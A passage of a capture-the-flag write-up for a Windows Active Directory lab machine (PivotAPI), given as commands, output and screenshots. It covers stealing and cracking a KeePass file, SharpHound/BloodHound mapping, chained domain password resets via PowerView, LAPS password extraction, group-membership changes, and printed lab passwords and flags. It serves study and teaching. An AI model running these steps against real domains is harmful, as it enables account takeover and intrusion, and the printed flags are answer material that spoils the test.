Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Documents\Mis imágenes'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_ms...ts\Mis imágenes:String) [Get-ChildItem], Unauthoriz 
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Documents\Mis vídeos'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Documents\Mis vídeos:String) [Get-ChildItem], Unau 
   thorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Entorno de red'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Entorno de red:String) [Get-ChildItem], Unauthoriz 
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Impresoras'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Impresoras:String) [Get-ChildItem], UnauthorizedAc 
   cessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Menú Inicio'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Menú Inicio:String) [Get-ChildItem], UnauthorizedA 
   ccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Mis documentos'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Mis documentos:String) [Get-ChildItem], Unauthoriz 
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Plantillas'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Plantillas:String) [Get-ChildItem], UnauthorizedAc 
   cessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\Reciente'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\Reciente:String) [Get-ChildItem], UnauthorizedAcce 
   ssException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : PivotAPI
 
Acceso denegado a la ruta de acceso 'C:\Users\svc_mssql\SendTo'.
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_mssql\SendTo:String) [Get-ChildItem], UnauthorizedAccess 
   Exception
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand


```

> **cool output, there is file in the desktop called `credentials.kdbx`, and this a data file created by `KeePass` and it's refers to `KeePass Password Database`.**

> **we can download this file to our machine by converting it's data to b64 and then save it in `.b64` file and then decode it by `base64` to recover it to the original one.**

> **`powershell.exe -command "$password = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('LICORDEBELLOTA\svc_mssql', $password); Invoke-Command -Credential $credential -ComputerName PivotAPI -ScriptBlock {$file = 'c:\users\svc_mssql\Desktop\credentials.kdbx'; $Base64_Code = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$file")); $Base64_Code;}"`**

![](https://i.ibb.co/DGvWhpv/b64kee.png)

> **copy the content and save it to file called `any.b64` and then decode.**

> **`base64 -d Creds.64 > credentials.kdbx`**

![](https://i.ibb.co/9scC16n/credens.png)

> **now we will crack this file with `john`.**

> `keepass2john Credentials.kdbx > hash.kee`

> `john --wordlist=/usr/share/wordlists/rockyou.txt hash.kee`

![](https://i.ibb.co/jVvjd0T/cracked.png)

> **cool, we cracked the password and it is `mahalkita`.**

![](https://raw.githubusercontent.com/davidcelis/gifs/master/yes/david-tennant-oh-yes.gif)

> **let's open the file now and we can open it with `keepass2`.**
> `sudo apt-get install keepass2`

> **open the file and enter the password.**

![](https://i.ibb.co/S3wHzpt/keepass.png)

> **right click and copy the password which is: `Gu4nCh3C4NaRi0N!23`**

> **let's try to login now with these credentials.**

![](https://i.ibb.co/DLMSBM8/ssh.png)

> **let's read user flag.**

```ruby


licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N\Desktop>type user.txt  
4855ef51169f74e4d5d79befd933d719

licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N\Desktop> 


```

![](https://raw.githubusercontent.com/davidcelis/gifs/master/yes/david-tennant-yup.gif)

## Lateral Movement

> **after enumerating the box i didn't find anything important so we need to let the dogs hunting.**

> **in this Point i uploaded [SharpHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1) by the `UPLOAD` function of the mssql shell.**

> **Read This [Blog](https://book.hacktricks.xyz/windows/active-directory-methodology/bloodhound) for better understanding what is SharpHound.**

![](https://i.ibb.co/g77nhZX/upload-shrp.png)

> **now we will `InvokeAllChecks` for `BloodHound`.**

> **`Import-Module .\SharpHound.ps1`**

> **`Invoke-BloodHound -CollectionMethod All`**

![](https://i.ibb.co/9sF7cNT/output-shr.png)

> **now we will download the `20210822132804_BloodHound.zip` to our machine with `scp` command.**

> **`scp 3v4Si0N@10.10.10.240:/temp/20210822132804_BloodHound.zip ./`**

![](https://i.ibb.co/7rcmwCn/scp.png)

> **now open `BloodHound` and drag and drop the zipped file.**

![](https://i.ibb.co/n17jrPV/blood.png)

> **now click on the left ans click on `Analysis` and choose `Find Shortest Path To Domain Admins`**.

![](https://i.ibb.co/db06sWS/admins.png)

> **there are 2 domain admins `ADMINISTRADOR` and `CYBERAVCA` so let's see the shortest path to any of them.**

![](https://i.ibb.co/NZ2zWwY/admin-path.png)

> **Long path, okay our user `3v4Si0N` has `GenericAll` Privilege on the user `DR.ZAIUSS` which is a memper of the `WINRM` Group and thats mean we can change his password and login with it.**

![](https://i.ibb.co/Jty7r8p/genallzaius.png)

> **Click on `GenericALL` and click help and it's will give you the commands and how to change this user password.**

![](https://i.ibb.co/cT70qHD/abuse-info.png)

![](https://i.ibb.co/0YYCPFM/abuse-2.png)

![](https://i.ibb.co/6PNYSrQ/abuse-3.png)

![](https://i.ibb.co/2FhwxDT/abuse4.pnghttps://i.ibb.co/2FhwxDT/abuse4.png)

> **Focus, here is the commands to change this user password and login with it but first upload [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).**

> **`$SecPassword = ConvertTo-SecureString 'Gu4nCh3C4NaRi0N!23' -AsPlainText -Force`**

> **`$Cred = New-Object System.Management.Automation.PSCredential('licordebellota\3v4Si0N', $SecPassword)`**

> **`$UserPassword = ConvertTo-SecureString 'Password123@@' -AsPlainText -Force`**

> **`Set-DomainUserPassword -Identity Dr.Zaiuss -AccountPassword $UserPassword -Credential $Cred`**

```ruby

PS C:\temp> Import-Module .\PowerView.ps1PS C:\temp> $SecPassword = ConvertTo-SecureString 'Gu4nCh3C4NaRi0N!23' -AsPlainText -Force
PS C:\temp> $Cred = New-Object System.Management.Automation.PSCredential('licordebellota\3v4Si0N', $SecPassword)     PS C:\temp> $UserPassword = ConvertTo-SecureString 'Password123@@' -AsPlainText -Force
PS C:\temp> Set-DomainUserPassword -Identity Dr.Zaiuss -AccountPassword $UserPassword -Credential $CredPS C:\temp>


```

> **let's check the password and list the shares..**

![](https://i.ibb.co/wKkZ0KV/zaiusss.png)

* nice, we owned the seconed user, let's get back to bloodhound.

> **the next user we should own it's `SUPERFUME` , Because this user has access to `C:\\developer` and there is something delicious for us hhahahah.**

> **we can own it with the same way we owned `DR.ZAIUSS` because `DR.ZAIUSS` has all `Privileges` On `SUPERFUME`.**

![](https://i.ibb.co/6Dn7h91/SUPERFU.png)

> **`$SecPassword = ConvertTo-SecureString 'Password123@@' -AsPlainText -Force`**

> **`$Cred = New-Object System.Management.Automation.PSCredential('licordebellota\DR.ZAIUSS', $SecPassword)`**

> **`$UserPassword = ConvertTo-SecureString 'Password123@@' -AsPlainText -Force`**

> **`Set-DomainUserPassword -Identity superfume -AccountPassword $UserPassword -Credential $Cred`**

> **and we can login with this command**.

> **`$userpass = ConvertTo-SecureString 'Password123@@' -AsPlainText -Force`**

> **`$creds = New-Object System.Management.Automation.PSCredential('licordebellota\superfume', $SecPassword)`**

> **`New-PSSession -ComputerName pivotAPI -Credential $credsNew-PSSession -ComputerName pivotAPI -Credential $creds`**
> **`Enter-PSSession 1`**

![](https://i.ibb.co/j8Fvv85/superfume-done.png)

> **let's see what is in the `Developers` directory.**

```ruby

[pivotAPI]: PS C:\> cd .\Developers\
[pivotAPI]: PS C:\Developers> ls


    Directorio: C:\Developers


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       08/08/2020     19:26                Jari
d-----       08/08/2020     19:23                Superfume


[pivotAPI]: PS C:\Developers> cd jari
[pivotAPI]: PS C:\Developers\jari> ls


    Directorio: C:\Developers\jari


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       08/08/2020     19:26           3676 program.cs
-a----       08/08/2020     19:18           7168 restart-mssql.exe


```

> **the restart-mssql.exe file have the password of the `Jari` user and i will show you how to extract it.**

> **cool, let's download the 2 files with the same way we download the bloodhound.zip to our machine now and then move the 2 files to the winVM.**

![](https://i.ibb.co/hBKdR4v/the2prog.png)

> **open the application with `dnspy`**

![](https://i.ibb.co/yWbDXKV/dnspy.png)

> **as we know this program execute some commands with the Jari privileges and there is the Password but it's encrypted.**

> **there is a couple of ways to do it. The way i did it was open the .exe in dnspy and then export it to a project. Then open in Visual Studio, and add some code to print the variable you want to the Debug console (Debug.WriteLine(xxxx)).**

> **let's export it to a project now and open it with VS.**

![](https://i.ibb.co/yWbDXKV/dnspy.png)

> **we will do the modification after this line, add the following strings to decrypt the function.**

* `string utfString = Encoding.UTF8.GetString(array, 0, array.Length);`
* ` Debug.WriteLine("utf" + utfString);`

![](https://i.ibb.co/s9N8rc2/vs2.png)

> **click build and you will see the password after that.**

![](https://i.ibb.co/Yp6M5mW/jari-pass.png)

> **cool the pass for jari is: `Cos@Chung@!RPG`, we now owned `Jari`, let's see what this user can do..**

![](https://i.ibb.co/HCyvF9j/gibdeon.png)

> **This user has privilege to change Password of `GIBDEON` so let's change it's password and see what we will achieve.**

> **`$SecPassword = ConvertTo-SecureString 'Cos@Chung@!RPG' -AsPlainText -Force`**

> **`$Cred = New-Object System.Management.Automation.PSCredential('licordebellota\jari', $SecPassword)`**

> **`$UserPassword = ConvertTo-SecureString 'Password123@@' -AsPlainText -Force`**

> **`Set-DomainUserPassword -Identity gibdeon -AccountPassword $UserPassword -Credential $Cred`**

> **now this user has the privilege to change the password of `LOTHBROK`**

![](https://i.ibb.co/rF53tFb/LOTHBROK.png)

> **`LOTHBROK` has LAPS Group membership, so once you have lothbrok's creds we will be able to extract the local admin password from AD, then we will use `GIBDEON` privilege to add the `ADMINISTRADOR` To `SSH` group and that's all.**

> **first let's change `LOTHBROK` password.**

> **`$SecPassword = ConvertTo-SecureString 'Password123@@' -AsPlainText -Force`**

> **`$Cred = New-Object System.Management.Automation.PSCredential('licordebellota\GIBDEON', $SecPassword)`**

> **`$UserPassword = ConvertTo-SecureString 'Password123@@' -AsPlainText -Force`**

> **`Set-DomainUserPassword -Identity lothbrok -AccountPassword $UserPassword -Credential $Cred`**

> **now we owned `LOTHBROK` let's see what he can do.**

![](https://i.ibb.co/7GSSRSt/loth.png)

![](https://i.ibb.co/0VnJq0H/loth2.png)

![](https://i.ibb.co/0j2R3Z7/loth3.png)

> **so we can extract administrator password now, let's do it.**

> **`$SecPassword = ConvertTo-SecureString 'Password123@@' -AsPlainText -Force`**

> **`$Cred = New-Object System.Management.Automation.PSCredential('licordebellota\lothbrok', $SecPassword)`**

> **`Get-DomainObject pivotAPI -Credential $Cred -Properties "ms-mcs-AdmPwd",name`**

![](https://i.ibb.co/Wf19FRF/admin-pass.png)

> **here we go, we got the `ADMINISTRADOR` Password and it is: `3E0sIIF4XYVbk8iJApu1`**

> **let's use `GIBDEON` Privilege to add the administrator to `SSH` group.**

> **`$SecPassword = ConvertTo-SecureString 'Password123@@' -AsPlainText -Force`**

> **`$Cred = New-Object System.Management.Automation.PSCredential('licordebellota\GIBDEON', $SecPassword)`**

> **`Add-DomainGroupMember -Identity 'SSH' -Members 'GIBDEON' -Credential $Cred`**

> **`Get-DomainGroupMember -Identity 'SSH'`**

![](https://i.ibb.co/pyvNzQB/addeddtossh.png)

> **let's login now**

![](https://i.ibb.co/cbryFMZ/donnnnnnnnnnn.png)

> **let's read root flag.**


```ruby

licordebellota\administrador@PIVOTAPI C:\Users\cybervaca\Desktop>type root.txt  
b32c5e3ee389ee920f6aa1efa025048d 
licordebellota\administrador@PIVOTAPI C:\Users\cybervaca\Desktop>

```

> **and we owned every user in the machine.**

![](https://i.ibb.co/ZX8srhK/doneeeeeeeee.png)

![](https://raw.githubusercontent.com/jglovier/gifs/gh-pages/puff/mr-robot-puff.gif)

* **cheers!**




